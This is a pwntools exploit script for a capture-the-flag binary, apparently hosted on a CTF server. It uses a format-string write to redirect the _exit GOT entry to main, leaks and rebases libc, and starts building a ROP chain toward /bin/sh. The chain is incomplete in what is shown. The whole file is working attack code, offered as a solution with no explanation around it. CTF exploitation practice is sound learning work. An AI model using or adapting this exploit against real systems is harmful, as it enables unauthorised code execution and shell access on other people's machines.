#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./chall", checksec=True)
libc = elf.libc
#context.log_level = "debug"
context.log_level = "critical"  # quiet mode

gs = """
set disable-randomization on
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("0.cloud.chals.io", 30732) 
    else:
        return process(elf.path)


io = start()


# replace got exit with main so we can do infinite format string attacks
payload = fmtstr_payload(8, {elf.got['_exit'] : elf.sym['main']})
io.sendline(payload)

# rebase libc
io.sendline(b"%p")
io.recvuntil(b"aaaabaThis challenge seems easy enough\n")

#for i in range(500, 1000):
#    io.sendline(f"{i} %{i}$p".encode())
leak = io.recvline().strip()
libc.address = int(leak, 16) - 0x21ab23
print(f"libc base @ {libc.address:#0x}")

writeable = libc.address + 0x1f4000
pop_rdi = p64(libc.address+0x000000000002a3e5)
ret = p64(libc.address+0x29139)
binsh = p64(next(libc.search(b"/bin/sh")))

first_write = fmtstr_payload(8, {writeable : pop_rdi})
io.sendline(first_write)

io.interactive()
